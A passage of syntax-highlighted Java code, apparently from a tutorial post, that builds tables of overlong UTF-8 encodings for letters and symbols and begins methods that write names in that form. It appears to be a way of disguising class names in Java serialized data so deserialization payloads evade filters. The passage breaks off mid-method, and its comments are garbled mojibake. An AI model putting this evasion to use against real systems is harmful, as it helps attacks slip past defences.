class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br><br><br>        bytesMap.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xbb</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x81</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x82</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x83</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x84</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x85</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x86</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x87</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x88</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x89</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8c</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8e</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8f</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x90</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x91</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x92</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x93</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x94</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x95</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x96</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x97</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x98</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x99</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaa</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xab</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xac</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xad</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaf</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb0</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xba</span>&#125;);<br><br>    &#125;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWritTwoBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//å°†nameè¿›è¡Œoverlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">2</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = map.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">2</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWriteThreeBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//å°†nameè¿›è¡Œoverlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">3</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span 